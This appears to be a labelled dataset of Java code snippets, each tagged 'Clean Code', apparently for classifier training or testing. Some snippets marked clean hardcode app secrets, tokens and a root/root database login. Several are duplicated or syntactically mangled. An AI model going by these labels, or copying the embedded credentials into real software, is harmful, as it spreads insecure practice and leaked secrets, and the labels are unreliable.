  public static final NetworkBuffer.Type<IntPacket> SERIALIZER=NetworkBufferTemplate.template(INT,IntPacket::value,IntPacket::new);
{
  }
  record CompressiblePacket(  String value){
  }
  public static final NetworkBuffer.Type<CompressiblePacket> SERIALIZER=NetworkBufferTemplate.template(STRING,CompressiblePacket::value,CompressiblePacket::new);
{
  }
  @Test public void writeSingleUncompressed(){
    var packet=new IntPacket(5);
    var buffer=PacketVanilla.PACKET_POOL.get();
    PacketWriting.writeFramedPacket(buffer,IntPacket.SERIALIZER,1,packet,-1);
    assertEquals(3 + 1 + 4,buffer.writeIndex(),""Invalid buffer position"");
  }
  @Test public void writeMultiUncompressed(){
    var packet=new IntPacket(5);
    var buffer=PacketVanilla.PACKET_POOL.get();
    PacketWriting.writeFramedPacket(buffer,IntPacket.SERIALIZER,1,packet,-1);
    PacketWriting.writeFramedPacket(buffer,IntPacket.SERIALIZER,1,packet,-1);
    assertEquals((3 + 1 + 4) * 2,buffer.writeIndex(),""Invalid buffer position"");
  }
  @Test public void writeSingleCompressed(){
    var string=""Hello world!"".repeat(200);
    var stringLength=string.getBytes(StandardCharsets.UTF_8).length;
    var lengthLength=getVarIntSize(stringLength);
    var packet=new CompressiblePacket(string);
    var buffer=PacketVanilla.PACKET_POOL.get();
    PacketWriting.writeFramedPacket(buffer,CompressiblePacket.SERIALIZER,1,packet,256);
    assertNotEquals(3 + 3 + 1+ lengthLength+ stringLength,buffer.writeIndex(),""Buffer position does not account for compression"");
  }
  @Test public void writeSingleCompressedSmall(){
    var packet=new IntPacket(5);
    var buffer=PacketVanilla.PACKET_POOL.get();
    PacketWriting.writeFramedPacket(buffer,IntPacket.SERIALIZER,1,packet,256);
    assertEquals(3 + 3 + 1+ 4,buffer.writeIndex(),""Invalid buffer position"");
  }
  @Test public void writeMultiCompressedSmall(){
    var packet=new IntPacket(5);
    var buffer=PacketVanilla.PACKET_POOL.get();
    PacketWriting.writeFramedPacket(buffer,IntPacket.SERIALIZER,1,packet,256);
    PacketWriting.writeFramedPacket(buffer,IntPacket.SERIALIZER,1,packet,256);
    assertEquals((3 + 3 + 1+ 4) * 2,buffer.writeIndex(),""Invalid buffer position"");
  }
  private static int getVarIntSize(  int input){
    return (input & 0xFFFFFF80) == 0 ? 1 : (input & 0xFFFFC000) == 0 ? 2 : (input & 0xFFE00000) == 0 ? 3 : (input & 0xF0000000) == 0 ? 4 : 5;
  }
}
",0,Clean Code
"@KestraTest class IndentFilterTest {
  @Inject VariableRenderer variableRenderer;
  @Test void indentNull() throws IllegalVariableEvaluationException {
    String render=variableRenderer.render(""{{ null | indent(2) }}"",Map.of());
    assertThat(render,emptyOrNullString());
  }
  @Test void indentEmpty() throws IllegalVariableEvaluationException {
    String render=variableRenderer.render(""{{ '' | indent(2) }}"",Map.of());
    assertThat(render,is(""""));
  }
  @Test void indentEmptyLines() throws IllegalVariableEvaluationException {
    String render=variableRenderer.render(""{{ \""\n\n\"" | indent(2) }}"",Map.of());
    assertThat(render,is(""\n  \n  ""));
  }
  @Test void indentString() throws IllegalVariableEvaluationException {
    String render=variableRenderer.render(""{{ 'string' | indent(2) }}"",Map.of());
    assertThat(render,is(""string""));
  }
  @Test void indentInteger() throws IllegalVariableEvaluationException {
    String render=variableRenderer.render(""{{ 1 | indent(2) }}"",Map.of());
    assertThat(render,is(""1""));
  }
  @Test void indentStringWithCRLF() throws IllegalVariableEvaluationException {
    String render=variableRenderer.render(""{{ \""first line\r\nsecond line\"" | indent(2) }}"",Map.of());
    assertThat(render,is(""first line\r\n  second line""));
  }
  @Test void indentStringWithLF() throws IllegalVariableEvaluationException {
    String render=variableRenderer.render(""{{ \""first line\nsecond line\"" | indent(2) }}"",Map.of());
    assertThat(render,is(""first line\n  second line""));
  }
  @Test void indentStringWithCR() throws IllegalVariableEvaluationException {
    String render=variableRenderer.render(""{{ \""first line\rsecond line\"" | indent(2) }}"",Map.of());
    assertThat(render,is(""first line\r  second line""));
  }
  @Test void indentStringWithSystemNewLine() throws IllegalVariableEvaluationException {
    String render=variableRenderer.render(""{{ \""first line"" + System.lineSeparator() + ""second line\"" | indent(2) }}"",Map.of());
    assertThat(render,is(""first line"" + System.lineSeparator() + ""  second line""));
  }
  @Test void indentWithTab() throws IllegalVariableEvaluationException {
    String render=variableRenderer.render(""{{ \""first line\nsecond line\"" | indent(2, \""\t\"") }}"",Map.of());
    assertThat(render,is(""first line\n\t\tsecond line""));
  }
}
",0,Clean Code
"public class RebalanceListener {
  public static void main(  String[] args){
    String topic=""Hello-Kafka"";
    String group=""group1"";
    Properties props=new Properties();
    props.put(""bootstrap.servers"",""hadoop001:9092"");
    props.put(""group.id"",group);
    props.put(""enable.auto.commit"",false);
    props.put(""key.deserializer"",""org.apache.kafka.common.serialization.StringDeserializer"");
    props.put(""value.deserializer"",""org.apache.kafka.common.serialization.StringDeserializer"");
    KafkaConsumer<String,String> consumer=new KafkaConsumer<>(props);
    Map<TopicPartition,OffsetAndMetadata> offsets=new HashMap<>();
    consumer.subscribe(Collections.singletonList(topic),new ConsumerRebalanceListener(){
      @Override public void onPartitionsRevoked(      Collection<TopicPartition> partitions){
        System.out.println(""再均衡即将触发"");
        consumer.commitSync(offsets);
      }
      @Override public void onPartitionsAssigned(      Collection<TopicPartition> partitions){
      }
    }
);
    try {
      while (true) {
        ConsumerRecords<String,String> records=consumer.poll(Duration.of(100,ChronoUnit.MILLIS));
        for (        ConsumerRecord<String,String> record : records) {
          System.out.println(record);
          TopicPartition topicPartition=new TopicPartition(record.topic(),record.partition());
          OffsetAndMetadata offsetAndMetadata=new OffsetAndMetadata(record.offset() + 1,""no metaData"");
          offsets.put(topicPartition,offsetAndMetadata);
        }
        consumer.commitAsync(offsets,null);
      }
    }
  finally {
      consumer.close();
    }
  }
}
",0,Clean Code
"/** 
 * 2FA 双因素认证 Service
 * @author zhaojun
 */
@Service public class TwoFactorAuthenticatorVerifyService {
  @Resource private SecretGenerator secretGenerator;
  @Resource private QrDataFactory qrDataFactory;
  @Resource private QrGenerator qrGenerator;
  @Resource private CodeVerifier verifier;
  @Resource private SystemConfigService systemConfigService;
  /** 
 * 生成 2FA 双因素认证二维码和密钥
 * @return  2FA 双因素认证二维码和密钥
 * @throws QrGenerationException   二维码生成异常
 */
  public LoginTwoFactorAuthenticatorResult setupDevice() throws QrGenerationException {
    String secret=secretGenerator.generate();
    QrData data=qrDataFactory.newBuilder().secret(secret).issuer(""ZFile"").build();
    String qrCodeImage=getDataUriForImage(qrGenerator.generate(data),qrGenerator.getImageMimeType());
    return new LoginTwoFactorAuthenticatorResult(qrCodeImage,secret);
  }
  /** 
 * 验证 2FA 双因素认证是否正确，正确则进行绑定.
 * @param verifyLoginTwoFactorAuthenticatorRequest 2FA 双因素认证请求参数
 */
  public void deviceVerify(  VerifyLoginTwoFactorAuthenticatorRequest verifyLoginTwoFactorAuthenticatorRequest){
    String secret=verifyLoginTwoFactorAuthenticatorRequest.getSecret();
    String code=verifyLoginTwoFactorAuthenticatorRequest.getCode();
    if (verifier.isValidCode(secret,code)) {
      SystemConfigDTO systemConfig=systemConfigService.getSystemConfig();
      systemConfig.setLoginVerifyMode(LoginVerifyModeEnum.TWO_FACTOR_AUTHENTICATION_MODE);
      systemConfig.setLoginVerifySecret(secret);
      systemConfigService.updateSystemConfig(systemConfig);
    }
 else {
      throw new LoginVerifyException(""验证码不正确"");
    }
  }
  /** 
 * 验证 2FA 双因素认证.
 * @param loginVerifySecret 2FA 双因素认证密钥
 * @param verifyCode 2FA 双因素认证验证码
 */
  public void checkCode(  String loginVerifySecret,  String verifyCode){
    if (!verifier.isValidCode(loginVerifySecret,verifyCode)) {
      throw new LoginVerifyException(""验证码错误或已失效"");
    }
  }
}
",0,Clean Code
"@Slf4j @Validated @RestController @RequestMapping(""spark/env"") public class SparkEnvController {
  @Autowired private SparkEnvService sparkEnvService;
  @PostMapping(""list"") public RestResponse list(){
    List<SparkEnv> sparkEnvList=sparkEnvService.list();
    return RestResponse.success(sparkEnvList);
  }
  @PostMapping(""check"") public RestResponse check(  SparkEnv version){
    FlinkEnvCheckEnum checkResp=sparkEnvService.check(version);
    return RestResponse.success(checkResp.getCode());
  }
  @PostMapping(""create"") public RestResponse create(  SparkEnv version){
    try {
      sparkEnvService.create(version);
    }
 catch (    Exception e) {
      throw new ApiDetailException(e);
    }
    return RestResponse.success(true);
  }
  @PostMapping(""get"") public RestResponse get(  Long id) throws Exception {
    SparkEnv sparkEnv=sparkEnvService.getById(id);
    sparkEnv.unzipSparkConf();
    return RestResponse.success(sparkEnv);
  }
  @PostMapping(""sync"") public RestResponse sync(  Long id) throws Exception {
    sparkEnvService.syncConf(id);
    return RestResponse.success();
  }
  @PostMapping(""update"") public RestResponse update(  SparkEnv version) throws Exception {
    try {
      sparkEnvService.update(version);
    }
 catch (    Exception e) {
      throw new ApiDetailException(e);
    }
    return RestResponse.success(true);
  }
  @PostMapping(""delete"") public RestResponse delete(  Long id){
    sparkEnvService.removeById(id);
    return RestResponse.success();
  }
  @PostMapping(""validity"") public RestResponse validity(  SparkEnv version){
    sparkEnvService.validity(version.getId());
    return RestResponse.success(true);
  }
  @PostMapping(""default"") public RestResponse setDefault(  Long id){
    sparkEnvService.setDefault(id);
    return RestResponse.success();
  }
}
",0,Clean Code
"public class SpringDocApp4Test extends AbstractSpringDocTest {
}
@TestPropertySource(properties=""springdoc.use-fqn=true"") public class SpringDocApp4Test extends AbstractSpringDocV30Test {
  @AfterAll static void restore(){
    TypeNameResolver.std.setUseFqn(false);
  }
@SpringBootApplication static class SpringDocTestApp {
  }
}
public class SpringDocApp4Test extends AbstractSpringDocTest {
@SpringBootApplication static class SpringDocTestApp {
  }
}
/** 
 * The type Spring doc app 4 test.
 */
@TestPropertySource(properties=""springdoc.use-fqn=true"") class SpringDocApp4Test extends AbstractSpringDocTest {
  /** 
 * Restore.
 */
  @AfterAll static void restore(){
    TypeNameResolver.std.setUseFqn(false);
  }
  /** 
 * The type Spring doc test app.
 */
@SpringBootApplication static class SpringDocTestApp {
  }
}
public class SpringDocApp4Test extends AbstractSpringDocTest {
}
",0,Clean Code
"/** 
 * PermissionMapper继承基类
 */
@Repository public interface PermissionMapper extends MyBatisBaseDao<Permission,Integer,PermissionExample> {
}
/** 
 * PermissionMapper继承基类
 */
@Repository public interface PermissionMapper extends MyBatisBaseDao<Permission,Integer,PermissionExample> {
}
/** 
 * PermissionMapper继承基类
 */
@Repository public interface PermissionMapper extends MyBatisBaseDao<Permission,Integer,PermissionExample> {
}
/** 
 * PermissionMapper继承基类
 */
@Repository public interface PermissionMapper extends MyBatisBaseDao<Permission,Integer,PermissionExample> {
}
/** 
 * PermissionMapper继承基类
 */
@Repository public interface PermissionMapper extends MyBatisBaseDao<Permission,Integer,PermissionExample> {
}
/** 
 * PermissionMapper继承基类
 */
@Repository public interface PermissionMapper extends MyBatisBaseDao<Permission,Integer,PermissionExample> {
}
",0,Clean Code
"/** 
 * 主应用程序类
 */
public class App030 {
  /** 
 * 应用程序主函数
 * @param argvArray 参数数组
 * @throws Exception
 */
  static public void main(  String[] argvArray) throws Exception {
    (new org.ormtest.step030.App030()).start();
  }
  /** 
 * 测试开始
 */
  private void start() throws Exception {
    Class.forName(""com.mysql.cj.jdbc.Driver"").newInstance();
    String dbConnStr=""jdbc:mysql://localhost:3306/ormtest?user=root&password=root"";
    Connection conn=DriverManager.getConnection(dbConnStr);
    Statement stmt=conn.createStatement();
    String sql=""select * from t_user limit 200000"";
    ResultSet rs=stmt.executeQuery(sql);
    XxxEntity_Helper helper=new XxxEntity_Helper();
    long t0=System.currentTimeMillis();
    while (rs.next()) {
      UserEntity ue=helper.create(UserEntity.class,rs);
    }
    long t1=System.currentTimeMillis();
    stmt.close();
    conn.close();
    System.out.println(""实例化花费时间 = "" + (t1 - t0) + ""ms"");
  }
}
",0,Clean Code
"/** 
 * Represents an inventory which can receive click input. All methods returning boolean returns true if the action is successful, false otherwise. <p> See <a href=""https://minecraft.wiki/w/Minecraft_Wiki:Projects/wiki.vg_merge/Protocol#Click_Container"">the Minecraft wiki</a> for more information.
 */
interface InventoryClickHandler {
  permits AbstractInventory;
{
  }
  /** 
 * Called when a  {@link Player} left click in the inventory. Can also be to drop the cursor item
 * @param player the player who clicked
 * @param slot   the slot number
 * @return true if the click hasn't been cancelled, false otherwise
 */
  boolean leftClick(  @NotNull Player player,  int slot);
  /** 
 * Called when a  {@link Player} right click in the inventory. Can also be to drop the cursor item
 * @param player the player who clicked
 * @param slot   the slot number
 * @return true if the click hasn't been cancelled, false otherwise
 */
  boolean rightClick(  @NotNull Player player,  int slot);
  /** 
 * Called when a  {@link Player} shift click in the inventory
 * @param player the player who clicked
 * @param slot   the slot number
 * @return true if the click hasn't been cancelled, false otherwise
 */
  boolean shiftClick(  @NotNull Player player,  int slot);
  /** 
 * Called when a  {@link Player} held click in the inventory
 * @param player the player who clicked
 * @param slot   the slot number
 * @param key    the held slot (0-8) pressed
 * @return true if the click hasn't been cancelled, false otherwise
 */
  boolean changeHeld(  @NotNull Player player,  int slot,  int key);
  boolean middleClick(  @NotNull Player player,  int slot);
  /** 
 * Called when a  {@link Player} press the drop button
 * @param player the player who clicked
 * @param all
 * @param slot   the slot number
 * @param button -999 if clicking outside, normal if he is not
 * @return true if the drop hasn't been cancelled, false otherwise
 */
  boolean drop(  @NotNull Player player,  boolean all,  int slot,  int button);
  boolean dragging(  @NotNull Player player,  int slot,  int button);
  /** 
 * Called when a  {@link Player} double click in the inventory
 * @param player the player who clicked
 * @param slot   the slot number
 * @return true if the click hasn't been cancelled, false otherwise
 */
  boolean doubleClick(  @NotNull Player player,  int slot);
  default void callClickEvent(  @NotNull Player player,  @NotNull AbstractInventory inventory,  int slot,  @NotNull ClickType clickType,  @NotNull ItemStack clicked,  @NotNull ItemStack cursor){
    EventDispatcher.call(new InventoryClickEvent(inventory,player,slot,clickType,clicked,cursor));
  }
}
",0,Clean Code
"/** 
 * @author 小六六
 * @version 1.0
 * @date 2020/4/19 18:09
 * @des题目描述 有一堆石头，每块石头的重量都是正整数。<p> 每一回合，从中选出两块 最重的 石头，然后将它们一起粉碎。假设石头的重量分别为 x 和 y，且 x <= y。那么粉碎的可能结果如下： <p> 如果 x == y，那么两块石头都会被完全粉碎； 如果 x != y，那么重量为 x 的石头将会完全粉碎，而重量为 y 的石头新重量为 y-x。 最后，最多只会剩下一块石头。返回此石头的重量。如果没有石头剩下，就返回 0。 <p> <p> <p> 示例： <p> 输入：[2,7,4,1,8,1] 输出：1 解释： 先选出 7 和 8，得到 1，所以数组转换为 [2,4,1,1,1]， 再选出 2 和 4，得到 2，所以数组转换为 [2,1,1,1]， 接着是 2 和 1，得到 1，所以数组转换为 [1,1,1]， 最后选出 1 和 1，得到 0，最终数组转换为 [1]，这就是最后剩下那块石头的重量。
 */
public class question1 {
  public static int lastStoneWeight(  int[] stones){
    if (stones[stones.length - 2] == 0) {
      return stones[stones.length - 1];
    }
    int index=stones.length - 1;
    Arrays.sort(stones);
    while (stones[index - 1] != 0) {
      int max=stones[index];
      int min=stones[index - 1];
      if (max == min) {
        stones[index]=stones[index - 1]=0;
      }
 else {
        stones[index]=max - min;
        stones[index - 1]=0;
      }
      Arrays.sort(stones);
    }
    return lastStoneWeight(stones);
  }
  public static void main(  String[] args){
    int[] stones={2,8};
    int i=lastStoneWeight(stones);
    System.out.println(i);
  }
}",0,Clean Code
"public final class MarkdownFormatterFactory extends BaseFormatterFactory {
  @Override public Formatter<Document> documentFormatter(){
    return this::childContents;
  }
  @Override public Formatter<Heading> headingFormatter(){
    return node -> {
      StringBuilder output=new StringBuilder();
      IntStream.range(0,node.getLevel()).forEach(i -> output.append(""#""));
      return output.append("" "").append(childContents(node)).append(System.lineSeparator()).toString();
    }
;
  }
  @Override public Formatter<Image> imageFormatter(){
    return node -> String.format(""![%s](%s)"",node.getAltText(),node.getSource());
  }
  @Override public Formatter<Link> linkFormatter(){
    return node -> String.format(""[%s](%s)"",node.getChildren().isEmpty() ? node.getUrl() : childContents(node),node.getUrl());
  }
  @Override public Formatter<List> listFormatter(){
    return node -> {
      StringBuilder output=new StringBuilder();
      node.getChildren().forEach(i -> {
        if (node.getStyle() == List.Style.BULLET) {
          output.append(""- "").append(format(i));
        }
 else {
          throw new IllegalArgumentException(""Unknown list type: "" + node.getStyle());
        }
        output.append(System.lineSeparator());
      }
);
      output.append(System.lineSeparator());
      return output.toString();
    }
;
  }
  @Override public Formatter<ListItem> listItemFormatter(){
    return this::childContents;
  }
  @Override public Formatter<Paragraph> paragraphFormatter(){
    return node -> childContents(node) + System.lineSeparator() + System.lineSeparator();
  }
  @Override public Formatter<Text> textFormatter(){
    return node -> htmlEscaper().escape(node.getContent());
  }
  @Override public Formatter<Bold> boldFormatter(){
    return node -> String.format(""**%s**"",childContents(node));
  }
}
",0,Clean Code
"/** 
 * @author lengleng
 * @date 2019-04-01<p> 数据源相关常量
 */
public interface DataSourceConstants {
  /** 
 * 数据源名称
 */
  String DS_NAME=""name"";
  /** 
 * 默认数据源（master）
 */
  String DS_MASTER=""master"";
  /** 
 * jdbcurl
 */
  String DS_JDBC_URL=""url"";
  /** 
 * 用户名
 */
  String DS_USER_NAME=""username"";
  /** 
 * 密码
 */
  String DS_USER_PWD=""password"";
  /** 
 * 驱动包名称
 */
  String DS_DRIVER_CLASS_NAME=""driver_class_name"";
}
",0,Clean Code
"/** 
 * @Author : 穆书伟
 * @Date : 19-4-2
 * @Version 1.0
 */
public class BasicTelemetryUploadRequest extends BasicRequest implements TelemetryUploadRequest {
  private static final long serialVersionUID=1L;
  private final Map<Long,List<KvEntry>> data;
  public BasicTelemetryUploadRequest(){
    this(DEFAULT_REQUEST_ID);
  }
  public BasicTelemetryUploadRequest(  Integer requestId){
    super(requestId);
    this.data=new HashMap<>();
  }
  public void add(  long ts,  KvEntry entry){
    List<KvEntry> tsEntries=data.get(ts);
    if (tsEntries == null) {
      tsEntries=new ArrayList<>();
      data.put(ts,tsEntries);
    }
    tsEntries.add(entry);
  }
  @Override public SessionMsgType getMsgType(){
    return SessionMsgType.POST_TELEMETRY_REQUEST;
  }
  @Override public Map<Long,List<KvEntry>> getData(){
    return data;
  }
  @Override public String toString(){
    return ""BasicTelemetryUploadRequest [dao="" + data + ""]"";
  }
}",0,Clean Code
"@Component public class DataMapTokenImpl implements TokenAuth {
  private static final Logger logger=LoggerFactory.getLogger(DataMapTokenImpl.class);
  @Autowired ApiServiceTokenManagerDao apiServiceTokenManagerDao;
  @Override public SaveTokenEnum saveTokensToDb(  List<TokenManagerVo> tokenManagerVos,  String approvalNo) throws ApiServiceTokenException {
    boolean isEmptyToken=tokenManagerVos.stream().filter(tokenManagerVo -> StringUtils.isEmpty(tokenManagerVo.getToken())).count() > 0;
    if (checkDuplicateAuth(approvalNo) && approvalNo != ApiCommonConstant.DEFAULT_APPROVAL_NO) {
      return SaveTokenEnum.DUPLICATE;
    }
 else     if (isEmptyToken) {
      throw new ApiServiceTokenException(800001,""Failed to save to db for Some token is empty"");
    }
 else {
      try {
        apiServiceTokenManagerDao.insertList(tokenManagerVos);
      }
 catch (      Exception e) {
        logger.error(""Batch save token to db failed"",e);
        return SaveTokenEnum.FAILED;
      }
    }
    return SaveTokenEnum.SUCCESS;
  }
  private boolean checkDuplicateAuth(  String approvalNo){
    if (apiServiceTokenManagerDao.queryApprovalNo(approvalNo) > 0) {
      return true;
    }
 else {
      return false;
    }
  }
  @Override public List<TokenManagerVo> genTokenRecord(  ApprovalVo approvalVo){
    List<TokenManagerVo> tokenManagerVoList=new ArrayList<>();
    Arrays.stream(approvalVo.getApplyUser().split("","")).forEach(tempUser -> {
      TokenManagerVo tmpToken=new TokenManagerVo();
      tmpToken.setApiId(approvalVo.getApiId());
      tmpToken.setApplyTime(new Date());
      tmpToken.setDuration(365L);
      tmpToken.setReason(""approval token auth"");
      tmpToken.setStatus(1);
      tmpToken.setIpWhitelist("""");
      tmpToken.setCaller(""scripts"");
      tmpToken.setUser(tempUser);
      tmpToken.setPublisher(approvalVo.getCreator());
      tmpToken.setApiVersionId(approvalVo.getApiVersionId());
      ApiServiceToken apiServiceToken=new ApiServiceToken();
      apiServiceToken.setApplyUser(tempUser);
      apiServiceToken.setPublisher(approvalVo.getCreator());
      apiServiceToken.setApplyTime(tmpToken.getApplyTime());
      apiServiceToken.setApiServiceId(approvalVo.getApiId());
      tmpToken.setToken(JwtManager.createToken(tempUser,apiServiceToken,tmpToken.getDuration()));
      tmpToken.setApplySource(approvalVo.getApprovalNo());
      tokenManagerVoList.add(tmpToken);
    }
);
    return tokenManagerVoList;
  }
}
",0,Clean Code
"public class WeightDecayTest {
  @Test public void l1DecayTest(){
    try (NDManager manager=NDManager.newBaseManager(TestUtils.getEngine())){
      NDArray parameters1=manager.create(new float[]{-1,-2,3,4,5});
      NDArray parameters2=manager.create(new float[]{-1,-1,-1,-1,-1});
      NDArray pred=manager.create(new float[0]);
      NDArray label=manager.create(new float[0]);
      L1WeightDecay decay=Loss.l1WeightedDecay("""",2.0f,new NDList(parameters1,parameters2));
      Assert.assertEquals(decay.evaluate(new NDList(label),new NDList(pred)).getFloat(),40.0f);
    }
   }
  @Test public void l2DecayTest(){
    try (NDManager manager=NDManager.newBaseManager(TestUtils.getEngine())){
      NDArray parameters1=manager.create(new float[]{-1,-2,3,4,5});
      NDArray parameters2=manager.create(new float[]{-1,-1,-1,-1,-1});
      NDArray pred=manager.create(new float[0]);
      NDArray label=manager.create(new float[0]);
      L2WeightDecay decay=Loss.l2WeightedDecay("""",2.0f,new NDList(parameters1,parameters2));
      Assert.assertEquals(decay.evaluate(new NDList(label),new NDList(pred)).getFloat(),120.0f);
    }
   }
  @Test public void elasticNetDecayTest(){
    try (NDManager manager=NDManager.newBaseManager(TestUtils.getEngine())){
      NDArray parameters1=manager.create(new float[]{-1,-2,3,4,5});
      NDArray parameters2=manager.create(new float[]{-1,-1,-1,-1,-1});
      NDArray pred=manager.create(new float[0]);
      NDArray label=manager.create(new float[0]);
      ElasticNetWeightDecay decay=Loss.elasticNetWeightedDecay("""",2.0f,1.0f,new NDList(parameters1,parameters2));
      Assert.assertEquals(decay.evaluate(new NDList(label),new NDList(pred)).getFloat(),100.0f);
    }
   }
}
",0,Clean Code
"@StreamPark(composeFiles=""docker/basic/docker-compose.yaml"") public class RoleManagementTest {
  public static RemoteWebDriver browser;
  private static final String newRoleName=""new_role"";
  private static final String newDescription=""new_description"";
  private static final String existMenuName=""Apache Flink"";
  @BeforeAll public static void setup(){
    new LoginPage(browser).login().goToNav(SystemPage.class).goToTab(RoleManagementPage.class);
  }
  @Test @Order(1) void testCreateRole(){
    final RoleManagementPage roleManagementPage=new RoleManagementPage(browser);
    roleManagementPage.createRole(newRoleName,newDescription,existMenuName);
    Awaitility.await().untilAsserted(() -> assertThat(roleManagementPage.roleList).as(""Role list should contain newly-created role"").extracting(WebElement::getText).anyMatch(it -> it.contains(newRoleName)));
  }
  @Test @Order(2) void testCreateDuplicateRole(){
    final RoleManagementPage roleManagementPage=new RoleManagementPage(browser);
    roleManagementPage.createRole(newRoleName,newDescription,existMenuName);
    Awaitility.await().untilAsserted(() -> assertThat(roleManagementPage.errorMessageList).as(""Role Name Duplicated Error message should be displayed"").extracting(WebElement::getText).anyMatch(it -> it.contains(""Sorry, the role name already exists"")));
    roleManagementPage.createRoleForm.buttonCancel.click();
  }
  @Test @Order(3) void testEditRole(){
    final RoleManagementPage roleManagementPage=new RoleManagementPage(browser);
    String newEditDescription=newDescription + ""_edit"";
    String newEditMenuName=""System"";
    roleManagementPage.editRole(newRoleName,newEditDescription,newEditMenuName);
    Awaitility.await().untilAsserted(() -> assertThat(roleManagementPage.roleList).as(""Role list should contain edited role"").extracting(WebElement::getText).anyMatch(it -> it.contains(newEditDescription)));
  }
  @Test @Order(4) void testDeleteRole(){
    final RoleManagementPage roleManagementPage=new RoleManagementPage(browser);
    roleManagementPage.deleteRole(newRoleName);
    Awaitility.await().untilAsserted(() -> assertThat(roleManagementPage.roleList).extracting(WebElement::getText).noneMatch(it -> it.contains(newRoleName)));
  }
}
",0,Clean Code
"public abstract class NewItemFragment extends DialogFragment {
  private OnNewFolderListener listener=null;
  public NewItemFragment(){
    super();
  }
  public void setListener(  @Nullable final OnNewFolderListener listener){
    this.listener=listener;
  }
  @Override public void onAttach(  Activity activity){
    super.onAttach(activity);
  }
  @NonNull @Override public Dialog onCreateDialog(  Bundle savedInstanceState){
    MaterialAlertDialogBuilder builder=new MaterialAlertDialogBuilder(getActivity());
    builder.setView(R.layout.nnf_dialog_folder_name).setTitle(github.tornaco.android.thanos.res.R.string.nnf_new_folder).setNegativeButton(github.tornaco.android.thanos.res.R.string.nnf_new_folder_cancel,null).setPositiveButton(github.tornaco.android.thanos.res.R.string.nnf_new_folder_ok,null);
    final AlertDialog dialog=builder.create();
    dialog.setOnShowListener(dialog1 -> {
      final AlertDialog dialog2=(AlertDialog)dialog1;
      final EditText editText=(EditText)dialog2.findViewById(R.id.edit_text);
      if (editText == null) {
        throw new NullPointerException(""Could not find an edit text in the dialog"");
      }
      Button cancel=dialog2.getButton(AlertDialog.BUTTON_NEGATIVE);
      cancel.setOnClickListener(view -> dialog2.cancel());
      final Button ok=dialog2.getButton(AlertDialog.BUTTON_POSITIVE);
      ok.setEnabled(false);
      ok.setOnClickListener(view -> {
        String itemName=editText.getText().toString();
        if (validateName(itemName)) {
          if (listener != null) {
            listener.onNewFolder(itemName);
          }
          dialog2.dismiss();
        }
      }
);
      editText.addTextChangedListener(new TextWatcher(){
        @Override public void beforeTextChanged(        final CharSequence s,        final int start,        final int count,        final int after){
        }
        @Override public void onTextChanged(        final CharSequence s,        final int start,        final int before,        final int count){
        }
        @Override public void afterTextChanged(        final Editable s){
          ok.setEnabled(validateName(s.toString()));
        }
      }
);
    }
);
    return dialog;
  }
  protected abstract boolean validateName(  final String itemName);
public interface OnNewFolderListener {
    void onNewFolder(    @NonNull final String name);
  }
}
",0,Clean Code
"/** 
 * An interceptor used to handle file uploads 
 */
@Component public class UploadFileTypeInterceptor implements HandlerInterceptor {
  private static final Logger logger=LoggerFactory.getLogger(UploadFileTypeInterceptor.class);
  @Override public boolean preHandle(  @Nonnull HttpServletRequest request,  @Nonnull HttpServletResponse response,  @Nonnull Object handler) throws Exception {
    if (request instanceof MultipartHttpServletRequest) {
      MultipartHttpServletRequest multipartRequest=(MultipartHttpServletRequest)request;
      Map<String,MultipartFile> files=multipartRequest.getFileMap();
      for (      String file : files.keySet()) {
        MultipartFile multipartFile=multipartRequest.getFile(file);
        ApiAlertException.throwIfNull(multipartFile,""File to upload can't be null. Upload file failed."");
        InputStream input=multipartFile.getInputStream();
        boolean isJarOrPyFile=FileUtils.isJarFileType(input) || isPythonFile(input);
        ApiAlertException.throwIfFalse(isJarOrPyFile,""Illegal file type, Only support standard jar or python files. Upload file failed."");
      }
    }
    return true;
  }
  @Override public void postHandle(  @Nonnull HttpServletRequest request,  @Nonnull HttpServletResponse response,  @Nonnull Object handler,  ModelAndView modelAndView) throws Exception {
    HandlerInterceptor.super.postHandle(request,response,handler,modelAndView);
  }
  @Override public void afterCompletion(  @Nonnull HttpServletRequest request,  @Nonnull HttpServletResponse response,  @Nonnull Object handler,  Exception ex) throws Exception {
    HandlerInterceptor.super.afterCompletion(request,response,handler,ex);
  }
  private boolean isPythonFile(  InputStream input){
    try {
      Tika tika=new Tika();
      String mimeType=tika.detect(input);
      return mimeType.equals(""text/x-python"");
    }
 catch (    Exception e) {
      logger.warn(""check upload file type failed."",e);
      return false;
    }
  }
}
",0,Clean Code
"public class WxConfig {
  private static boolean debug=Boolean.TRUE;
  public static String getWebConfig(  String url){
    String jsticket=TicketAPI.ticketGetticket(TokenManager.getDefaultToken()).getTicket();
    String config;
    if (debug) {
      config=JsUtil.generateConfigJson(jsticket,Boolean.FALSE,""wx711871aa2b926a2d"",url,""getLocation"",""startRecord"",""stopRecord"",""onVoiceRecordEnd"",""playVoice"",""pauseVoice"",""stopVoice"",""onVoicePlayEnd"",""uploadVoice"");
    }
 else {
      config=JsUtil.generateConfigJson(jsticket,Boolean.FALSE,""wx0b173fa0035cca01"",url,""getLocation"",""startRecord"",""stopRecord"",""onVoiceRecordEnd"",""playVoice"",""pauseVoice"",""stopVoice"",""onVoicePlayEnd"",""uploadVoice"");
    }
    return config;
  }
  public static String getTokenString(){
    if (debug) {
      return ""piziniao2019"";
    }
 else {
      return ""microlife"";
    }
  }
  public static String getAppId(){
    if (debug) {
      return ""wx711871aa2b926a2d"";
    }
 else {
      return ""wx0b173fa0035cca01"";
    }
  }
  public static String getAppPass(){
    if (debug) {
      return ""b0d0f3b4cdd5ba3ef3751e771c689278"";
    }
 else {
      return ""29067bd1d9546c5107d38b1f0d39cb4d"";
    }
  }
  public static String getDomain(){
    if (debug) {
      return ""http://demo.duozuiyu.com"";
    }
 else {
      return ""http://silianchedui.duozuiyu.com"";
    }
  }
}
",0,Clean Code
"@Tag(name=""管理后台 - 站内信模版"") @RestController @RequestMapping(""/system/notify-template"") @Validated public class NotifyTemplateController {
  @Resource private NotifyTemplateService notifyTemplateService;
  @Resource private NotifySendService notifySendService;
  @PostMapping(""/create"") @Operation(summary=""创建站内信模版"") @PreAuthorize(""@ss.hasPermission('system:notify-template:create')"") public CommonResult<Long> createNotifyTemplate(  @Valid @RequestBody NotifyTemplateSaveReqVO createReqVO){
    return success(notifyTemplateService.createNotifyTemplate(createReqVO));
  }
